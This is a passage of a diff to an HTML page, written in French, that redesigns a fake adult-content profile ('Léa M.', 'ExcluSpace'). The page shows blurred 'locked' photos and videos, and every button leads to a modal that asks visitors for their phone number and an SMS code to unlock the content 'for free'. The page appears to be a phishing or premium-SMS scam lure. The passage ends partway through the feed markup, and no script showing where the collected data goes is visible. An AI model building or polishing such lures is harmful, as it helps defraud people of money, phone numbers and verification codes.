@@ -3,328 +3,668 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Contenu exclusif</title>
+<title>Léa M. (@lea_exclu)</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 *{box-sizing:border-box;margin:0;padding:0}
-html,body{min-height:100%;background:#09000f;font-family:'Inter',sans-serif;color:#fff;-webkit-font-smoothing:antialiased}
-body{
-  padding-top:calc(env(safe-area-inset-top,0px) + 1.2rem);
-  padding-bottom:calc(env(safe-area-inset-bottom,0px) + 2rem);
-  padding-left:0;padding-right:0;
-  background:
-    radial-gradient(ellipse at 10% 0%,rgba(220,50,130,.22) 0%,transparent 55%),
-    radial-gradient(ellipse at 90% 90%,rgba(140,20,90,.18) 0%,transparent 55%),
-    #09000f;
+html{scroll-behavior:smooth}
+body{font-family:'Inter',sans-serif;color:#fff;-webkit-font-smoothing:antialiased;background:#0c0010;min-height:100vh}
+
+/* ══ TOPBAR ══ */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:.7rem 1rem;padding-top:calc(env(safe-area-inset-top,0px) + .7rem);
+  background:rgba(12,0,16,.85);backdrop-filter:blur(12px);
+  border-bottom:1px solid rgba(255,255,255,.06);
 }
-.wrap{max-width:420px;margin:0 auto;padding:0 1rem}
+.tb-logo{display:flex;align-items:center;gap:.4rem}
+.tb-icon{width:24px;height:24px;border-radius:6px;background:linear-gradient(135deg,#ff4d9e,#b5005b);display:flex;align-items:center;justify-content:center;font-size:11px}
+.tb-name{font-size:13px;font-weight:800;letter-spacing:.2px}
+.tb-right{display:flex;align-items:center;gap:.5rem}
+.tb-btn{height:30px;padding:0 12px;border-radius:20px;border:1px solid rgba(255,77,158,.3);background:transparent;color:#ff6db6;font-size:11px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;transition:background .2s}
+.tb-btn:hover{background:rgba(255,77,158,.1)}
+.tb-dots{width:30px;height:30px;border-radius:50%;border:1px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);display:flex;align-items:center;justify-content:center;font-size:14px;cursor:pointer}
 
-/* ── platform bar ── */
-.pbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:1.4rem;padding-bottom:1rem;border-bottom:1px solid rgba(255,255,255,.06)}
-.plogo{display:flex;align-items:center;gap:.45rem}
-.picon{width:26px;height:26px;border-radius:7px;background:linear-gradient(135deg,#ff4d9e,#b5005b);display:flex;align-items:center;justify-content:center;font-size:13px}
-.pname{font-size:14px;font-weight:800;letter-spacing:.3px}
-.pbadge{font-size:9px;padding:3px 8px;border-radius:20px;background:rgba(255,77,158,.12);color:#ff6db6;border:1px solid rgba(255,77,158,.25);font-weight:700;letter-spacing:.8px}
+/* ══ BANNER ══ */
+.banner{position:relative;height:130px;overflow:hidden;background:#1a0020}
+#banner-cv{width:100%;height:100%;display:block}
 
-/* ── profile ── */
-.profile{display:flex;flex-direction:column;align-items:center;margin-bottom:1.2rem}
-.av-wrap{position:relative;margin-bottom:.75rem}
-.av{width:76px;height:76px;border-radius:50%;border:2.5px solid #ff4d9e;overflow:hidden;box-shadow:0 0 0 4px rgba(255,77,158,.12)}
-.av canvas{width:100%;height:100%;display:block}
-.online{position:absolute;bottom:4px;right:4px;width:14px;height:14px;border-radius:50%;background:#3ddc84;border:2.5px solid #09000f}
-.pname-row{display:flex;align-items:center;gap:5px;font-size:17px;font-weight:800;margin-bottom:3px}
-.vtick{width:16px;height:16px;border-radius:50%;background:#ff4d9e;display:flex;align-items:center;justify-content:center;font-size:8px;flex-shrink:0}
-.handle{color:rgba(255,255,255,.38);font-size:12px;margin-bottom:.7rem}
-.stats{display:flex;gap:1.8rem}
-.st{text-align:center}
-.st-n{font-size:15px;font-weight:700}
-.st-l{font-size:10px;color:rgba(255,255,255,.35);margin-top:1px;letter-spacing:.3px}
+/* ══ PROFILE HEADER ══ */
+.prof-wrap{padding:0 1rem;margin-bottom:.2rem}
+.prof-top{display:flex;align-items:flex-end;justify-content:space-between;margin-top:-36px;margin-bottom:.75rem}
+.av-wrap{position:relative}
+.av{width:76px;height:76px;border-radius:50%;border:3px solid #0c0010;overflow:hidden;box-shadow:0 0 0 2px #ff4d9e}
+#av-cv{width:100%;height:100%;display:block}
+.av-live{position:absolute;bottom:4px;right:4px;background:#3ddc84;border:2px solid #0c0010;border-radius:20px;font-size:8px;font-weight:800;padding:1px 5px;letter-spacing:.5px;color:#0c0010}
+.prof-actions{display:flex;gap:.5rem;align-items:center;padding-bottom:4px}
+.btn-msg{width:34px;height:34px;border-radius:50%;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);display:flex;align-items:center;justify-content:center;font-size:15px;cursor:pointer;transition:background .2s}
+.btn-msg:hover{background:rgba(255,255,255,.1)}
+.btn-sub{height:34px;padding:0 16px;border-radius:20px;border:none;background:linear-gradient(135deg,#ff4d9e,#c0005a);color:#fff;font-size:12px;font-weight:800;cursor:pointer;font-family:'Inter',sans-serif;letter-spacing:.2px;box-shadow:0 4px 14px rgba(255,77,158,.3);transition:opacity .2s;display:flex;align-items:center;gap:5px}
+.btn-sub:hover{opacity:.88}
 
-/* ── grid ── */
-.grid-title{font-size:10px;font-weight:700;letter-spacing:1.5px;color:rgba(255,255,255,.3);text-transform:uppercase;margin-bottom:.6rem}
-.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:.5rem;margin-bottom:1.4rem}
-.card{position:relative;border-radius:11px;overflow:hidden;aspect-ratio:1;background:#18001a;border:1px solid rgba(255,255,255,.05)}
-.card canvas{width:100%;height:100%;display:block;filter:blur(24px) brightness(.65) saturate(1.3)}
-.card-ov{position:absolute;inset:0;background:linear-gradient(to bottom,transparent 20%,rgba(0,0,0,.55) 100%);display:flex;flex-direction:column;align-items:center;justify-content:center}
-.lc{width:36px;height:36px;border-radius:50%;background:rgba(0,0,0,.5);border:1.5px solid rgba(255,77,158,.35);display:flex;align-items:center;justify-content:center;font-size:15px;margin-bottom:4px;backdrop-filter:blur(3px)}
-.ulabel{font-size:9px;font-weight:800;letter-spacing:2.5px;color:rgba(255,255,255,.75)}
-.cmeta{position:absolute;bottom:6px;right:7px;font-size:9px;color:rgba(255,255,255,.38);display:flex;align-items:center;gap:3px}
-.ctag{position:absolute;top:6px;left:7px;font-size:8px;font-weight:700;letter-spacing:.5px;padding:2px 6px;border-radius:4px;background:rgba(0,0,0,.5);color:rgba(255,255,255,.55)}
+.prof-name{display:flex;align-items:center;gap:5px;font-size:17px;font-weight:800;margin-bottom:2px}
+.vtick{width:15px;height:15px;border-radius:50%;background:#ff4d9e;display:flex;align-items:center;justify-content:center;font-size:7px;flex-shrink:0}
+.prof-handle{color:rgba(255,255,255,.38);font-size:12px;margin-bottom:.5rem}
+.prof-bio{font-size:13px;color:rgba(255,255,255,.7);line-height:1.55;margin-bottom:.65rem}
+.prof-bio a{color:#ff6db6;text-decoration:none}
+.prof-tags{display:flex;flex-wrap:wrap;gap:.35rem;margin-bottom:.8rem}
+.tag{font-size:10px;font-weight:600;padding:3px 9px;border-radius:20px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);color:rgba(255,255,255,.5)}
 
-/* ── panel ── */
-.panel{background:rgba(255,255,255,.034);border:1px solid rgba(255,255,255,.07);border-radius:16px;padding:1.2rem}
-.ph{display:flex;align-items:center;gap:9px;margin-bottom:1rem;padding-bottom:1rem;border-bottom:1px solid rgba(255,255,255,.06)}
-.ph-icon{width:36px;height:36px;border-radius:10px;background:rgba(255,77,158,.1);border:1px solid rgba(255,77,158,.18);display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0}
-.ph-title{font-size:13px;font-weight:700}
-.ph-sub{font-size:11px;color:rgba(255,255,255,.35);margin-top:2px}
+.prof-stats{display:flex;gap:1.5rem;padding:.75rem 0;border-top:1px solid rgba(255,255,255,.06);border-bottom:1px solid rgba(255,255,255,.06);margin-bottom:.6rem}
+.st{display:flex;align-items:center;gap:5px}
+.st-n{font-size:14px;font-weight:800}
+.st-l{font-size:11px;color:rgba(255,255,255,.38);font-weight:500}
 
-/* ── steps ── */
+.sub-banner{
+  display:flex;align-items:center;justify-content:space-between;
+  background:rgba(255,77,158,.07);border:1px solid rgba(255,77,158,.18);
+  border-radius:10px;padding:.65rem .9rem;margin-bottom:.2rem;cursor:pointer;
+  transition:background .2s;
+}
+.sub-banner:hover{background:rgba(255,77,158,.12)}
+.sb-left{font-size:12px;color:rgba(255,255,255,.6);line-height:1.45}
+.sb-left strong{color:#fff;font-size:13px;display:block;margin-bottom:1px}
+.sb-right{font-size:12px;font-weight:700;color:#ff6db6;white-space:nowrap}
+
+/* ══ TABS ══ */
+.tabs{
+  display:flex;border-bottom:1px solid rgba(255,255,255,.07);
+  position:sticky;top:calc(env(safe-area-inset-top,0px) + 45px);z-index:40;
+  background:rgba(12,0,16,.92);backdrop-filter:blur(10px);
+}
+.tab{
+  flex:1;text-align:center;padding:.7rem .5rem;font-size:12px;font-weight:600;
+  color:rgba(255,255,255,.35);cursor:pointer;position:relative;
+  transition:color .2s;border:none;background:transparent;font-family:'Inter',sans-serif;
+}
+.tab.active{color:#ff6db6}
+.tab.active::after{content:'';position:absolute;bottom:0;left:20%;right:20%;height:2px;background:#ff4d9e;border-radius:2px}
+.tab-count{font-size:9px;margin-left:3px;opacity:.6}
+
+/* ══ FEED ══ */
+.feed{padding:.5rem 0}
+.panel-tab{display:none}
+.panel-tab.active{display:block}
+
+/* post card */
+.post{border-bottom:1px solid rgba(255,255,255,.06);padding:.9rem 1rem}
+.post-head{display:flex;align-items:center;gap:.55rem;margin-bottom:.65rem}
+.post-av{width:34px;height:34px;border-radius:50%;overflow:hidden;flex-shrink:0;border:1.5px solid rgba(255,77,158,.4)}
+#post-av0,#post-av1,#post-av2,#post-av3,#post-av4{width:100%;height:100%;display:block}
+.post-meta{flex:1}
+.post-who{display:flex;align-items:center;gap:4px;font-size:13px;font-weight:700}
+.post-time{font-size:11px;color:rgba(255,255,255,.3);margin-top:1px}
+.post-opts{font-size:18px;color:rgba(255,255,255,.2);cursor:pointer;padding:0 4px}
+
+.post-text{font-size:13px;color:rgba(255,255,255,.75);line-height:1.6;margin-bottom:.65rem}
+.post-text .mention{color:#ff6db6}
+
+/* media bloqué */
+.locked-media{position:relative;border-radius:12px;overflow:hidden;margin-bottom:.65rem;cursor:pointer}
+.locked-media canvas{width:100%;display:block;filter:blur(26px) brightness(.55) saturate(1.2)}
+.lm-ratio-1{aspect-ratio:4/3}
+.lm-ratio-2{aspect-ratio:16/9}
+.lm-ov{
+  position:absolute;inset:0;
+  background:linear-gradient(to bottom,rgba(0,0,0,.05) 0%,rgba(0,0,0,.65) 100%);
+  display:flex;flex-direction:column;align-items:center;justify-content:center;
+  gap:.4rem;
+}
+.lm-icon{font-size:26px;filter:drop-shadow(0 2px 8px rgba(0,0,0,.5))}
+.lm-txt{font-size:11px;font-weight:700;letter-spacing:1.5px;color:rgba(255,255,255,.7)}
+.lm-btn{
+  display:flex;align-items:center;gap:5px;
+  background:linear-gradient(135deg,#ff4d9e,#c0005a);
+  border:none;border-radius:20px;padding:7px 16px;
+  color:#fff;font-size:12px;font-weight:700;cursor:pointer;
+  font-family:'Inter',sans-serif;
+  box-shadow:0 4px 16px rgba(255,77,158,.4);
+  transition:opacity .2s,transform .15s;margin-top:.2rem;
+}
+.lm-btn:hover{opacity:.9}
+.lm-btn:active{transform:scale(.96)}
+
+/* double media */
+.media-duo{display:grid;grid-template-columns:1fr 1fr;gap:.4rem;margin-bottom:.65rem}
+.media-duo .locked-media{margin-bottom:0}
+
+/* post actions */
+.post-actions{display:flex;gap:1.2rem}
+.pa{display:flex;align-items:center;gap:.3rem;color:rgba(255,255,255,.3);font-size:12px;font-weight:500;cursor:pointer;transition:color .2s}
+.pa:hover{color:rgba(255,255,255,.6)}
+.pa .pi{font-size:14px}
+.pa.liked{color:#ff4d9e}
+
+/* ══ MEDIA GRID ══ */
+.media-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:2px}
+.mg-item{position:relative;aspect-ratio:1;overflow:hidden;cursor:pointer;background:#18001a}
+.mg-item canvas{width:100%;height:100%;display:block;filter:blur(18px) brightness(.6)}
+.mg-item:hover canvas{filter:blur(18px) brightness(.75)}
+.mg-ov{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,.2)}
+.mg-lock{font-size:18px;filter:drop-shadow(0 1px 4px rgba(0,0,0,.6))}
+.mg-tag{position:absolute;top:5px;right:5px;background:rgba(0,0,0,.6);border-radius:4px;font-size:8px;font-weight:700;padding:2px 5px;color:rgba(255,255,255,.7)}
+
+/* ══ ABOUT ══ */
+.about-section{padding:1rem}
+.about-row{display:flex;align-items:flex-start;gap:.75rem;padding:.7rem 0;border-bottom:1px solid rgba(255,255,255,.05)}
+.about-row:last-child{border-bottom:none}
+.ar-icon{font-size:18px;flex-shrink:0;margin-top:1px}
+.ar-label{font-size:11px;color:rgba(255,255,255,.3);font-weight:500;margin-bottom:2px}
+.ar-val{font-size:13px;color:rgba(255,255,255,.75);font-weight:500}
+.ar-val a{color:#ff6db6;text-decoration:none}
+
+/* ══ MODAL ══ */
+.modal-bg{
+  position:fixed;inset:0;z-index:100;
+  background:rgba(0,0,0,.65);backdrop-filter:blur(4px);
+  display:flex;align-items:flex-end;justify-content:center;
+  opacity:0;pointer-events:none;transition:opacity .25s;
+}
+.modal-bg.open{opacity:1;pointer-events:all}
+.modal{
+  width:100%;max-width:500px;
+  background:#130018;border:1px solid rgba(255,255,255,.08);
+  border-radius:20px 20px 0 0;
+  padding:0 1rem calc(env(safe-area-inset-bottom,0px) + 1.5rem);
+  transform:translateY(100%);transition:transform .3s cubic-bezier(.32,0,.22,1);
+  max-height:90vh;overflow-y:auto;
+}
+.modal-bg.open .modal{transform:translateY(0)}
+.modal-handle{width:38px;height:4px;border-radius:2px;background:rgba(255,255,255,.15);margin:12px auto 1.2rem}
+.modal-head{display:flex;align-items:center;gap:.65rem;margin-bottom:1.1rem;padding-bottom:1rem;border-bottom:1px solid rgba(255,255,255,.07)}
+.mh-icon{width:38px;height:38px;border-radius:10px;background:rgba(255,77,158,.1);border:1px solid rgba(255,77,158,.18);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.mh-title{font-size:14px;font-weight:700}
+.mh-sub{font-size:11px;color:rgba(255,255,255,.32);margin-top:2px}
+.modal-close{margin-left:auto;font-size:20px;color:rgba(255,255,255,.25);cursor:pointer;padding:4px;line-height:1}
+
+/* steps */
 .steps{display:flex;align-items:center;margin-bottom:1.1rem}
-.s{display:flex;align-items:center;gap:5px;font-size:11px;font-weight:500;color:rgba(255,255,255,.3);transition:color .3s}
-.s.active{color:#ff6db6}
-.s.done{color:rgba(255,255,255,.45)}
-.sd{width:20px;height:20px;border-radius:50%;border:1.5px solid rgba(255,255,255,.1);background:rgba(255,255,255,.05);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:800;flex-shrink:0;transition:all .3s}
-.s.active .sd{border-color:#ff4d9e;background:rgba(255,77,158,.15);color:#ff6db6}
-.s.done .sd{border-color:rgba(255,255,255,.2);background:rgba(255,255,255,.08);color:rgba(255,255,255,.5)}
-.sl{flex:1;height:1px;background:rgba(255,255,255,.07);margin:0 7px;transition:background .3s}
-.sl.done{background:rgba(255,77,158,.3)}
+.stp{display:flex;align-items:center;gap:5px;font-size:11px;font-weight:500;color:rgba(255,255,255,.28);transition:color .3s}
+.stp.active{color:#ff6db6}
+.stp.done{color:rgba(255,255,255,.45)}
+.sdt{width:20px;height:20px;border-radius:50%;border:1.5px solid rgba(255,255,255,.1);background:rgba(255,255,255,.04);display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:800;flex-shrink:0;transition:all .3s}
+.stp.active .sdt{border-color:#ff4d9e;background:rgba(255,77,158,.15);color:#ff6db6}
+.stp.done .sdt{border-color:rgba(255,255,255,.2);background:rgba(255,255,255,.08);color:rgba(255,255,255,.5)}
+.stl{flex:1;height:1px;background:rgba(255,255,255,.07);margin:0 7px;transition:background .4s}
+.stl.done{background:rgba(255,77,158,.35)}
 
-/* ── form ── */
-.flabel{font-size:10px;font-weight:700;letter-spacing:.7px;color:rgba(255,255,255,.4);text-transform:uppercase;margin-bottom:.4rem}
-.frow{display:flex;gap:7px;margin-bottom:.7rem}
-.fflag{display:flex;align-items:center;gap:5px;padding:0 11px;height:46px;border-radius:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.09);color:rgba(255,255,255,.65);font-size:13px;font-weight:600;flex-shrink:0;letter-spacing:.2px}
-input[type=tel],input[type=number]{flex:1;height:46px;padding:0 14px;border-radius:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.09);color:#fff;font-size:15px;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s,box-shadow .2s;-moz-appearance:textfield}
-input::placeholder{color:rgba(255,255,255,.18)}
+/* form */
+.flabel{display:flex;align-items:center;justify-content:space-between;font-size:10px;font-weight:700;letter-spacing:.7px;color:rgba(255,255,255,.38);text-transform:uppercase;margin-bottom:.4rem}
+.vtag{font-size:10px;font-weight:700;letter-spacing:0;text-transform:none;padding:2px 7px;border-radius:20px;opacity:0;transition:opacity .25s}
+.vtag.ok{opacity:1;color:#3ddc84;background:rgba(61,220,132,.1);border:1px solid rgba(61,220,132,.2)}
+.vtag.er{opacity:1;color:#ff6b6b;background:rgba(255,107,107,.08);border:1px solid rgba(255,107,107,.2)}
+.frow{display:flex;gap:7px;margin-bottom:.55rem}
+.fflag{display:flex;align-items:center;gap:5px;height:48px;padding:0 11px;border-radius:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);color:rgba(255,255,255,.65);font-size:13px;font-weight:600;flex-shrink:0;user-select:none}
+input[type=tel]{flex:1;height:48px;padding:0 14px;border-radius:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);color:#fff;font-size:15px;font-family:'Inter',sans-serif;outline:none;transition:border-color .2s,box-shadow .2s}
+input[type=tel].v-ok{border-color:rgba(61,220,132,.4);background:rgba(61,220,132,.04)}
+input[type=tel].v-er{border-color:rgba(255,107,107,.35)}
+input[type=number]{flex:1;height:48px;padding:0 14px;border-radius:10px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.08);color:#fff;font-size:22px;font-family:'Inter',sans-serif;outline:none;text-align:center;letter-spacing:8px;font-weight:700;transition:border-color .2s,box-shadow .2s;-moz-appearance:textfield}
+input::placeholder{color:rgba(255,255,255,.17)}
 input:focus{border-color:rgba(255,77,158,.45);box-shadow:0 0 0 3px rgba(255,77,158,.09)}
 input::-webkit-inner-spin-button,input::-webkit-outer-spin-button{-webkit-appearance:none}
-.code-inp{text-align:center;letter-spacing:8px;font-size:22px;font-weight:700}
+.fhint{font-size:11px;color:rgba(255,255,255,.27);line-height:1.55;margin-bottom:.85rem}
+.fhint strong{color:rgba(255,255,255,.48)}
+.fhint .hi{color:#ff6db6}
+.mbtn{width:100%;height:48px;border-radius:10px;border:none;background:linear-gradient(135deg,#ff4d9e,#c0005a);color:#fff;font-size:14px;font-weight:700;cursor:pointer;font-family:'Inter',sans-serif;position:relative;box-shadow:0 6px 20px rgba(255,77,158,.28);transition:opacity .2s,transform .1s}
+.mbtn:hover{opacity:.9}
+.mbtn:active{transform:scale(.98)}
+.mbtn:disabled{opacity:.4;cursor:not-allowed;box-shadow:none}
+.mbtn.loading{pointer-events:none;opacity:.7}
+.mspin{display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%)}
+@keyframes sp{to{transform:translate(-50%,-50%) rotate(360deg)}}
+.mbtn.loading .mbtxt{opacity:0}
+.mbtn.loading .mspin{display:block}
+.resend{text-align:center;margin-top:.65rem;font-size:11px;color:rgba(255,255,255,.23)}
+.resend em{color:rgba(255,77,158,.55);font-style:normal}
+.stmsg{display:flex;align-items:center;gap:5px;margin-top:.6rem;font-size:12px;min-height:18px;font-weight:500}
+.stmsg.err{color:#ff6b6b}
+.stmsg.ok{color:#3ddc84}
+.fine{text-align:center;font-size:9px;color:rgba(255,255,255,.17);margin-top:.8rem;line-height:1.7}
+.fine a{color:rgba(255,77,158,.35);text-decoration:none}
 
-.sms-note{font-size:11px;color:rgba(255,255,255,.3);line-height:1.55;margin-bottom:.85rem}
-.sms-note strong{color:rgba(255,255,255,.55);font-weight:600}
-
-.btn{width:100%;height:46px;border-radius:10px;border:none;background:linear-gradient(135deg,#ff4d9e 0%,#c0005a 100%);color:#fff;font-size:14px;font-weight:700;cursor:pointer;letter-spacing:.2px;transition:opacity .2s,transform .1s;font-family:'Inter',sans-serif;position:relative}
-.btn:hover{opacity:.9}
-.btn:active{transform:scale(.98)}
-.btn.loading{pointer-events:none;opacity:.7}
-.spinner{display:none;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite;position:absolute;left:50%;top:50%;transform:translate(-50%,-50%)}
-@keyframes spin{to{transform:translate(-50%,-50%) rotate(360deg)}}
-.btn.loading .btn-txt{opacity:0}
-.btn.loading .spinner{display:block}
-
-.resend{text-align:center;margin-top:.7rem;font-size:11px;color:rgba(255,255,255,.25)}
-.resend em{color:rgba(255,77,158,.5);font-style:normal}
-
-.status{display:flex;align-items:center;gap:6px;margin-top:.7rem;font-size:12px;min-height:18px;padding:0 2px;font-weight:500}
-.status.err{color:#ff6b6b}
-.status.ok{color:#3ddc84}
-.status.spin{color:rgba(255,255,255,.35)}
-
-.fine{text-align:center;font-size:9.5px;color:rgba(255,255,255,.18);margin-top:.85rem;line-height:1.7}
-.fine a{color:rgba(255,77,158,.4);text-decoration:none}
+/* bottom nav */
+.bnav{
+  position:fixed;bottom:0;left:0;right:0;z-index:45;
+  display:flex;background:rgba(12,0,16,.92);backdrop-filter:blur(12px);
+  border-top:1px solid rgba(255,255,255,.06);
+  padding-bottom:env(safe-area-inset-bottom,0px);
+}
+.bn{flex:1;display:flex;flex-direction:column;align-items:center;padding:.55rem .5rem;cursor:pointer;transition:color .2s;color:rgba(255,255,255,.28);font-size:9px;font-weight:600;gap:3px;border:none;background:none;font-family:'Inter',sans-serif}
+.bn.active{color:#ff4d9e}
+.bn .bni{font-size:20px}
+.page-pad{padding-bottom:calc(env(safe-area-inset-bottom,0px) + 60px)}
 </style>
 </head>
 <body>
-<div class="wrap">
 
-  <!-- Barre plateforme -->
-  <div class="pbar">
-    <div class="plogo">
-      <div class="picon">🔐</div>
-      <div class="pname">ExcluSpace</div>
-    </div>
-    <div class="pbadge">PREMIUM</div>
+<!-- Top bar -->
+<div class="topbar">
+  <div class="tb-logo">
+    <div class="tb-icon">🔐</div>
+    <div class="tb-name">ExcluSpace</div>
   </div>
+  <div class="tb-right">
+    <button class="tb-btn" onclick="openModal()">S'abonner</button>
+    <div class="tb-dots">⋯</div>
+  </div>
+</div>
 
-  <!-- Profil -->
-  <div class="profile">
+<div class="page-pad">
+
+<!-- Banner -->
+<div class="banner"><canvas id="banner-cv"></canvas></div>
+
+<!-- Profile header -->
+<div class="prof-wrap">
+  <div class="prof-top">
     <div class="av-wrap">
-      <div class="av"><canvas id="avc" width="150" height="150"></canvas></div>
-      <div class="online"></div>
+      <div class="av"><canvas id="av-cv" width="150" height="150"></canvas></div>
+      <div class="av-live">LIVE</div>
     </div>
-    <div class="pname-row">Léa M. <div class="vtick">✓</div></div>
-    <div class="handle">@lea_exclu</div>
-    <div class="stats">
-      <div class="st"><div class="st-n">1 284</div><div class="st-l">Abonnés</div></div>
-      <div class="st"><div class="st-n">58</div><div class="st-l">Contenus</div></div>
-      <div class="st"><div class="st-n">🔥 Live</div><div class="st-l">Statut</div></div>
+    <div class="prof-actions">
+      <div class="btn-msg" onclick="openModal()">💬</div>
+      <button class="btn-sub" onclick="openModal()">🔓 Accès gratuit</button>
     </div>
   </div>
 
-  <!-- Grille contenu flou -->
-  <div class="grid-title">Contenu exclusif · 4 médias verrouillés</div>
-  <div class="grid">
-    <div class="card"><canvas id="cv0" width="300" height="300"></canvas>
-      <div class="ctag">PHOTO</div>
-      <div class="card-ov"><div class="lc">🔒</div><div class="ulabel">UNLOCK</div></div>
-      <div class="cmeta">👁 2.1k</div></div>
-    <div class="card"><canvas id="cv1" width="300" height="300"></canvas>
-      <div class="ctag">VIDÉO</div>
-      <div class="card-ov"><div class="lc">🔒</div><div class="ulabel">UNLOCK</div></div>
-      <div class="cmeta">👁 3.4k</div></div>
-    <div class="card"><canvas id="cv2" width="300" height="300"></canvas>
-      <div class="ctag">PHOTO</div>
-      <div class="card-ov"><div class="lc">🔒</div><div class="ulabel">UNLOCK</div></div>
-      <div class="cmeta">👁 1.8k</div></div>
-    <div class="card"><canvas id="cv3" width="300" height="300"></canvas>
-      <div class="ctag">VIDÉO</div>
-      <div class="card-ov"><div class="lc">🔒</div><div class="ulabel">UNLOCK</div></div>
-      <div class="cmeta">👁 4.2k</div></div>
+  <div class="prof-name">Léa M. <div class="vtick">✓</div></div>
+  <div class="prof-handle">@lea_exclu · <span style="color:#3ddc84;font-size:11px">● En ligne</span></div>
+  <div class="prof-bio">
+    Contenu exclusif 🔥 · Déverrouille gratuitement avec ton numéro 📲<br>
+    <a href="#" onclick="openModal();return false">Clique ici pour accéder →</a>
   </div>
+  <div class="prof-tags">
+    <div class="tag">🔞 +18</div>
+    <div class="tag">📸 Photos</div>
+    <div class="tag">🎬 Vidéos</div>
+    <div class="tag">💌 Messages privés</div>
+  </div>
+  <div class="prof-stats">
+    <div class="st"><div class="st-n">1 284</div>&nbsp;<div class="st-l">abonnés</div></div>
+    <div class="st"><div class="st-n">58</div>&nbsp;<div class="st-l">publications</div></div>
+    <div class="st"><div class="st-n">12k</div>&nbsp;<div class="st-l">j'aime</div></div>
+  </div>
+  <div class="sub-banner" onclick="openModal()">
+    <div class="sb-left"><strong>Déverrouille tout le contenu gratuitement</strong>Vérification par SMS · Aucun paiement requis</div>
+    <div class="sb-right">GRATUIT →</div>
+  </div>
+</div>
 
-  <!-- Panel déverrouillage -->
-  <div class="panel">
-    <div class="ph">
-      <div class="ph-icon">🔓</div>
-      <div>
-        <div class="ph-title">Accès au contenu privé</div>
-        <div class="ph-sub">Vérification de ton identité requise</div>
+<!-- Tabs -->
+<div class="tabs">
+  <button class="tab active" onclick="showTab('posts',this)">Publications<span class="tab-count">58</span></button>
+  <button class="tab" onclick="showTab('medias',this)">Médias<span class="tab-count">42</span></button>
+  <button class="tab" onclick="showTab('about',this)">À propos</button>
+</div>
+
+<!-- ══ POSTS TAB ══ -->
+<div id="tab-posts" class="panel-tab active">
+  <div class="feed">
+
+    <!-- Post 1 : texte libre -->
+    <div class="post">
+      <div class="post-head">
+        <div class="post-av"><canvas id="post-av0" width="80" height="80"></canvas></div>
+        <div class="post-meta">
+          <div class="post-who">Léa M. <div class="vtick" style="width:12px;height:12px;font-size:6px">✓</div></div>
+          <div class="post-time">Il y a 2 heures</div>
+        </div>
+        <div class="post-opts">⋯</div>
+      </div>
+      <div class="post-text">Nouveau contenu dispo 🔥 Déverrouillez pour voir la suite… vous allez pas être déçus 😉 <span class="mention">#exclusif</span> <span class="mention">#privé</span></div>
+      <div class="post-actions">
+        <div class="pa"><span class="pi">🤍</span> 248</div>
+        <div class="pa"><span class="pi">💬</span> 34</div>
+        <div class="pa"><span class="pi">↗️</span> Partager</div>
       </div>
     </div>
 
-    <!-- Étapes -->
+    <!-- Post 2 : media verrouillé -->
+    <div class="post">
+      <div class="post-head">
+        <div class="post-av"><canvas id="post-av1" width="80" height="80"></canvas></div>
+        <div class="post-meta">
+          <div class="post-who">Léa M. <div class="vtick" style="width:12px;height:12px;font-size:6px">✓</div></div>
+          <div class="post-time">Il y a 5 heures</div>
+        </div>
+        <div class="post-opts">⋯</div>
+      </div>
+      <div class="post-text">Petite séance photo du soir 📸✨</div>
+      <div class="locked-media lm-ratio-1" onclick="openModal()">
+        <canvas id="lm0" width="400" height="300"></canvas>
+        <div class="lm-ov">
+          <div class="lm-icon">🔒</div>
+          <div class="lm-txt">CONTENU PRIVÉ</div>
+          <button class="lm-btn">🔓 Déverrouiller gratuitement</button>
+        </div>
+      </div>
+      <div class="post-actions">
+        <div class="pa"><span class="pi">🤍</span> 512</div>
+        <div class="pa"><span class="pi">💬</span> 67</div>
+        <div class="pa"><span class="pi">↗️</span> Partager</div>
+      </div>
+    </div>
+
+    <!-- Post 3 : texte -->
+    <div class="post">
+      <div class="post-head">
+        <div class="post-av"><canvas id="post-av2" width="80" height="80"></canvas></div>
+        <div class="post-meta">
+          <div class="post-who">Léa M. <div class="vtick" style="width:12px;height:12px;font-size:6px">✓</div></div>
+          <div class="post-time">Hier</div>
+        </div>
+        <div class="post-opts">⋯</div>
+      </div>
+      <div class="post-text">Merci pour tous vos messages 💌 Je réponds à tout le monde en privé dès que je peux 🥰 N'hésitez pas à déverrouiller mon profil c'est <strong>entièrement gratuit</strong> !</div>
+      <div class="post-actions">
+        <div class="pa liked"><span class="pi">❤️</span> 891</div>
+        <div class="pa"><span class="pi">💬</span> 143</div>
+        <div class="pa"><span class="pi">↗️</span> Partager</div>
+      </div>
+    </div>
+
+    <!-- Post 4 : double media verrouillé -->
+    <div class="post">
+      <div class="post-head">
+        <div class="post-av"><canvas id="post-av3" width="80" height="80"></canvas></div>
+        <div class="post-meta">
+          <div class="post-who">Léa M. <div class="vtick" style="width:12px;height:12px;font-size:6px">✓</div></div>
